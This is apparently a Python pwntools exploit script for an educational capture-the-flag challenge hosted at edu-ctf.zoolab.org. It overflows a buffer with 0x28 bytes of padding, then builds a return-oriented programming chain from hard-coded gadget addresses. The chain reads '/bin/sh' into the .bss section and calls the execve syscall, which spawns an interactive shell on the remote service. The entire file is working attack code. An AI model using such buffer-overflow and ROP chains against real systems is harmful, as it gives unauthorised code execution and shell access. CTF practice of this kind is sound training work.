from pwn import *

# context.log_level = 'debug'
context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

r = remote("edu-ctf.zoolab.org", "10003")
# r = process('./share/chal')

bss = 0x4CBBBB
read = 0x4470c0

pop_rdi_ret = 0x401e3f
pop_rsi_ret = 0x409e6e
pop_rdx_pop_rbx_ret = 0x47ed0b
pop_rax_ret = 0x447b27
syscall = 0x401bf4

ROP = b"A" * 0x28
ROP += flat(
    pop_rdi_ret, 0x0,
    pop_rsi_ret, bss,
    pop_rdx_pop_rbx_ret, 0x8, 0x0,
    read,
    
    pop_rdi_ret, bss,
    pop_rsi_ret, 0x0,
    pop_rax_ret, 0x3b,
    pop_rdx_pop_rbx_ret, 0x0, 0x0,
    syscall,
)

r.sendafter(b"show me rop\n> ", ROP)
r.sendline(b'/bin/sh\x00')

r.interactive()